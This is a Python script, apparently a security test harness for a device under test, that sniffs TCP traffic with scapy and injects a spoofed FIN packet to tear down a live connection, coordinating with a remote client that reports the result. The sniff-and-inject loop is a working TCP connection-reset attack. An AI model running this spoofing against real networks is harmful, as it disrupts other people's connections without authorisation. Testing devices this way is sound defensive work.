import socket
import threading
import time

from Config import CTRL_IP, CTRL_PORT, CLIENT_IP, DUT_PORT, IFACE_ID, TEST_TIMEOUT
from DataClasses import RmtCmd
from HelpFunctions import BuildSpoofedTcpPackets, RecvTimeout
from scapy.all import conf, IFACES, sniff
from scapy.layers.inet import TCP


def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as ctrlSocket:
        ctrlSocket.bind((str(CTRL_IP), CTRL_PORT))
        ctrlSocket.listen(1)
        print('Listening...')

        # Warte auf Client
        rmtSocket, rmtAddr = ctrlSocket.accept()
        print(f'Client registered: {rmtAddr}')

        # Setze Sniff-Thread und RawSocket auf
        iface = IFACES.dev_from_index(IFACE_ID)
        rawSocket = conf.L2socket(iface=iface)
        rcvdPackets = []
        stopThread = False

        def SnifferFunction():
            def AppendPacket(pkt):
                if stopThread:
                    exit()
                if pkt.haslayer(TCP):
                    layer = pkt.getlayer(TCP)
                    if layer.sport == DUT_PORT and layer.dport == DUT_PORT:
                        feasible = layer.flags.value & 0x10 and layer.underlayer.src == str(CLIENT_IP)
                        rcvdPackets.append((feasible,
                                            layer.seq.to_bytes(4, 'big'),
                                            layer.ack.to_bytes(4, 'big'),
                                            layer.underlayer.id))
            sniff(prn=AppendPacket, iface=iface, count=0)

        sniffThread = threading.Thread(target=SnifferFunction)

        # Warte auf Testfallstart
        print('Start test?\n')
        cmd = input()
        if not cmd.lower() in ['y', 'yes', '+']:
            print(f'Testcase will be aborted')
            ctrlSocket.shutdown(socket.SHUT_RDWR)
            return

        sniffThread.start()
        rmtSocket.sendall(RmtCmd.StartTest)

        # Warte auf Evaluierung Sollverhalten
        data = rmtSocket.recv(1024)
        match data:
            case RmtCmd.Working:
                print(f'DuT is working fine. Continue with testcase')
            case RmtCmd.NotWorking:
                print(f'Error on DuT abort testcase!')
                stopThread = True
                return
            case _:
                print(f'Received unknown command from client. Aborting testcase!')

        # Starte Angriff
        time.sleep(1)
        timeout = time.time() + TEST_TIMEOUT
        while True:
            isFeasible, seq, ack, ipId = rcvdPackets[-1]

            if isFeasible:
                tcpFin = BuildSpoofedTcpPackets(ipId=ipId,
                                                sequNo=seq,
                                                ackNo=ack)
                rawSocket.send(tcpFin.Pack())
                print(f'Send spoofed packet: {tcpFin.Pack()}')
                break

            if time.time() > timeout:
                print(f'Reached timeout, no feasible packet for attack has been found!')
                break
            time.sleep(0.1)

        # Warte auf Nachricht von Client
        if not RecvTimeout(rmtSocket, 5) == RmtCmd.NotWorking:
            print('No message from client')
            rmtSocket.sendall(RmtCmd.StopTest)
        else:
            print('Received message from Client. TCP connection has been killed successfully')
            rmtSocket.recv(1024)
        stopThread = True
        return


if __name__ == '__main__':
    main()
